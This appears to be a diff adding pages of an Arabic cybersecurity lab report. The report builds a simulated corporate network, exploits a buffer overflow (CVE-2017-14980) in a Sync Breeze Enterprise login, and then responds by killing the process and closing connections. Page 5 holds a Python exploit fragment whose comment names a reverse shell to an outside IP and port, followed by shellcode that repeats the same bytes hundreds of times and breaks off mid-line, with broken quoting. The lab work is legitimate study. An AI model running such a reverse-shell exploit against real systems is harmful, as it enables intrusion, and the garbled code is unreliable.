@@ -1,0 +1,221 @@
+=== Page 1 ===
+المقدمة
+
+تعد البيئة الأمنية للشركات أحد العناصر الحيوية التي تضمن حماية البيانات والمعلومات الحساسة من
+الهجمات الإلكترونية والاختراقات. في ظل تزايد التهديدات الإلكترونية وتنوع أساليب الاختراق، أصبح من
+الضروري تعزيز إجراءات الأمان ووضع آليات دفاعية فعالة لتحصين الأنظمة والمعلومات. يتناول هذا
+الفصل دراسة تحليلية تهدف إلى تقييم أمان بيئة شركة من خلال تطبيق هجوم على هذه البيئة، ثم تحليل
+النتائج وتقديم الحلول الأمنية المناسبة لمواجهة مثل هذه التهديدات.
+
+• الأدوات وأنظمة التشغيل المستخدمة:
+
+▪ VMware Workstation Pro
+▪ Windows Server 2019
+▪ Windows Enterprise
+▪ PfSense (Firewall, Router)
+▪ Kali Linux
+▪ Security Onion
+▪ Suricata (IPS / IDS)
+▪ PfBlockerNG (DNS Black Listing)
+▪ Immunity Debugger
+
+▪ VMware Workstation Pro:
+
+سنستخدم في مشروعنا برنامج VMware Workstation 17 Pro لمحاكاة بيئة المشروع. وهو
+برنامج يستخدم لإنشاء وإدارة الأجهزة الافتراضية، يتيح استخدام عدة أنظمة تشغيل في نفس الوقت
+داخل نظام التشغيل الأساسي وهذا مفيد بشكل خاص للمطورين والمختبرين ومدراء نظم الذين
+يحتاجون إلى اختبار تطبيقات وبرامج في بيئات مختلفة دون الحاجة لعدة أجهزة.
+
+◦ المميزات الرئيسية لـ VMware Workstation Pro:
+
+1. إنشاء الأجهزة وتحديد مواصفاتها مثل الذاكرة والمعالج والتخزين بكل سهولة.
+2. يدعم تشغيل مجموعة واسعة من أنظمة التشغيل.
+3. يمكن إعداد شبكات افتراضية معقدة داخل البرنامج لاختبار الشبكات والتطبيقات.
+
+13
+
+=== Page 2 ===
+3. في الخطوة 2 نضع DNS خادم DNS الأساسي 8.8.8.8 ونضع 4.4.4.4 كخادم DNS الثانوي،
+ننقر على "Next".
+
+Step 1 of 5
+General Information
+On this screen the general pfSense parameters will be set.
+Hostname
+pfSense
+Domain
+example.com
+EXAMPLE.example.com
+Primary DNS Server
+8.8.8.8
+Secondary DNS Server
+4.4.4.4
+Override DNS
+[x]
+Allow DNS servers to be overridden by DHCP/PPP on WAN
+Next
+
+4. في الخطوة 3 من 9، نختار منطقة زمنية. ننقر على "Next". في الخطوة 4 من 9، نلغاء تحديد
+الخيارين الأخيرين. في الخطوة 5 من 9، ننقر على "Next".
+5. في الخطوة 6 من 9، نقوم بتعيين كلمة مرور جديدة لـ Admin. ننقر على "Next".
+
+Step 4 of 5
+Set Admin WebGUI Password
+On this screen the admin password will be set, which is used to access the WebGUI and also SSH services if enabled.
+Admin Password
+[ ]
+Admin Password AGAIN
+[ ]
+Next
+
+6. في الخطوة 7 من 9، ننقر على "Reload". في هذه المرحلة، اكتملت إعدادات pfSense ويمكن
+الآن إجراء تغييرات على المنافذ.
+7. نضغط على تبويب Interfaces
+a. نختار LAN.
+b. بالنسبة لـ 'Description'، قم بتغيير LAN إلى Kali.
+
+26
+
+=== Page 3 ===
+■ اعداد Security Onion
+
+1. تنزيل Security Onion من الرابط هنا: ISO file
+.a VMware WorkStation
+.b نحدد (Typical Installation) >> << نقر التالي.
+.c Installer disc image file >> SO ISO file path >> Click Next.
+
+New Virtual Machine Wizard
+Guest Operating System Installation:
+A virtual machine is like a physical computer; it needs an operating
+system. How will you install the guest operating system?
+
+Install from:
+O Installer disc:
+No drives available
+
+Installer disc image file (os):
+C:\Users\Day\Cyberbox\OneDrive\Desktop\Cyberse... [Browse...]
+⚠ Could not detect which operating system is in this disc image.
+You will need to specify which operating system will be installed.
+O I will install the operating system later...
+The virtual machine will be created with a blank hard disk.
+
+Help < Back < Next > Cancel
+
+2. .نختار click Next. Linux: CentOS 7 64-Bit
+
+New Virtual Machine Wizard
+Select a Guest Operating System
+Which operating system will be installed on this virtual machine?
+
+Guest operating system
+O Microsoft Windows
+◉ Linux
+O VMware ESX
+O Other
+
+Version
+CentOS 7 64-bit
+
+Help < Back < Next > Cancel
+
+3. .نقم بتخصيص العتاد كما يلي:
+.a قم بتغيير RAM إلى 4-32 جيجابايت.
+.b أضف Adapters شبكة وقم بتعيينهما لـ Vmnet 4 و Vmnet 5 على التوالي.
+
+40
+
+=== Page 4 ===
+🌐 192.168.2.11/login
+
+Sync Breeze Enterprise Login
+User Name: Yusuf
+Password: **********
+Login Cancel
+
+❖ لاحظنا أن عدد الأحرف محدود في واجهة تسجيل الدخول الحالية.
+
+3. تحليل الطلب (Request)
+- للقيام بذلك بشكل صحيح، يجب علينا أولاً معرفة شكل الطلب (request) الذي يتم إرساله من الواجهة إلى التطبيق. سنقوم بالخطوات التالية:
+
+○ تثبيت التطبيق: تثبيت نسخة من التطبيق على جهاز محلي بحيث يمكننا التحكم الكامل في البيئة وتحليل سلوك التطبيق بدقة.
+
+○ محاولة تسجيل الدخول: سنقوم بمحاولة تسجيل الدخول باستخدام بيانات عشوائية، مثل أسماء مستخدمين وكلمات مرور غير متوقعة.
+
+Sync Breeze Enterprise Login
+User Name: ahmad
+Password: *****
+Login Cancel
+
+○ التقاط حزم البيانات باستخدام Wireshark: سنستخدم أداة Wireshark لالتقاط وتحليل حزم البيانات، لكي نتمكن من هذه الأداة معرفة شكل الطلبات المرسلة من واجهة تسجيل الدخول إلى التطبيق.
+
+| No. | Time | Info | Source | Destination | Protocol | Length |
+|---|---|---|---|---|---|---|
+| 1 | 14:29:3872373 | [SYN] Seq=32128 Ack=0 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 2 | 14:29:3872373 | [SYN, ACK] Seq=0 Ack=32129 Win=65535 Len=0 | 192.168.1.11 | 192.168.2.11 | TCP | 54 |
+| 3 | 14:27:892608381 | [ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 4 | 14:29:3872373 | [FIN, ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 5 | 14:29:842159428 | [SYN] Seq=32128 Ack=0 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 6 | 14:29:842159428 | [SYN, ACK] Seq=0 Ack=32129 Win=65535 Len=0 | 192.168.1.11 | 192.168.2.11 | TCP | 54 |
+| 7 | 14:29:842159428 | [ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 8 | 14:29:842159428 | [FIN, ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 9 | 14:29:842159428 | [SYN] Seq=32128 Ack=0 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 10 | 14:29:842159428 | [SYN, ACK] Seq=0 Ack=32129 Win=65535 Len=0 | 192.168.1.11 | 192.168.2.11 | TCP | 54 |
+| 11 | 14:29:842159428 | [ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 12 | 14:29:842159428 | [FIN, ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 13 | 14:29:842159428 | [SYN] Seq=32128 Ack=0 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 14 | 14:29:842159428 | [SYN, ACK] Seq=0 Ack=32129 Win=65535 Len=0 | 192.168.1.11 | 192.168.2.11 | TCP | 54 |
+| 15 | 14:29:842159428 | [ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 16 | 14:29:842159428 | [FIN, ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 17 | 14:29:842159428 | [SYN] Seq=32128 Ack=0 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 18 | 14:29:842159428 | [SYN, ACK] Seq=0 Ack=32129 Win=65535 Len=0 | 192.168.1.11 | 192.168.2.11 | TCP | 54 |
+| 19 | 14:29:842159428 | [ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+| 20 | 14:29:842159428 | [FIN, ACK] Seq=32129 Ack=1 Win=65535 Len=0 | 192.168.2.11 | 192.168.1.11 | TCP | 54 |
+
+58
+
+=== Page 5 ===
+#tool/exploit python3
+import os
+from urllib import request
+
+GIFTS = """
+# redefine c window shell_reverse_tcp 100.102.100.106 PORT=9000 HTTP/1.1
+# python -c 'shellcode'
+shellcode = """\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x00\x00\x00\x00\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc0\x50\x48\x89\xe2\x48\x31\xc
+
+=== Page 6 ===
+* نلاحظ أن خدمة Sync Breeze Enterprise هي خدمة شرعية موجودة على النظام. وبعد البحث
+عبر الإنترنت، تبين أن النسخة v.10.0.28 من هذه الخدمة مصابة بثغرة Buffer Overflow، والتي
+تم تسجيلها برقم CVE-2017-14980. لذلك، فإن الإجراء الأمثل يتضمن تعليق العملية وقطع
+الاتصال، ومن ثم البحث عن ترقية (Patch) لهذه الثغرة.
+
+3. إيقاف العملية (Kill The Process)
+- taskkill /F /PID 2548
+- taskkill يستخدم لإنهاء عمليات العمل في نظام التشغيل Windows من خلال سطر الأوامر.
+- F\: هذا الجزء يحدد أن الأمر يجب أن يكون قاسيًا (forceful)، مما يعني أنه سينتهي العملية بشكل
+فوري دون الحاجة للتأكد من المستخدم. إذا لم يتم تحديد هذا الخيار، فقد يظهر مربع حوار للتأكد من
+المستخدم قبل إيقاف العملية.
+- 2548\PID\: يُحدد هذا الجزء معرف العملية (PID) التي تريد إنهاءها. في هذا السياق، يتم إيقاف
+العملية التي لها معرف العملية يساوي 2548.
+
+[Administrator: Command Prompt]
+C:\Users\Administrator> taskkill /F /PID 2548
+SUCCESS: The process with PID 2548 has been terminated.
+C:\Users\Administrator>
+
+* تم إيقاف العملية.
+
+4. قطع الاتصال
+- cports /close 192.168.2.14 * 192.168.1.106 * 2548
+cports /close <Local Address>* <Local Port>* <Remote Address> <Remote Port>*
+{Process Name/ID}
+هذا الأمر يستخدم لإغلاق جميع الاتصالات إلى العنوان البعيد (Remote Address)
+على جميع المنافذ التي تعمل على العملية 2548 باستخدام اداة CurrPorts.
+- cports: هو اسم البرنامج الذي يستخدم لإدارة اتصالات الشبكة.
+- close: يشير إلى أن الهدف من الأمر هو اغلاق الاتصالات.
+- 192.168.2.14: عنوان IP المصدر للاتصال.
+- 192.168.1.106: العنوان البعيد الذي نريد إغلاق الاتصالات به.
+- *: يستخدم لتحديد جميع المنافذ البعيدة، مما يعني أن الأمر ينطبق على جميع المنافذ البعيدة.
+
+87
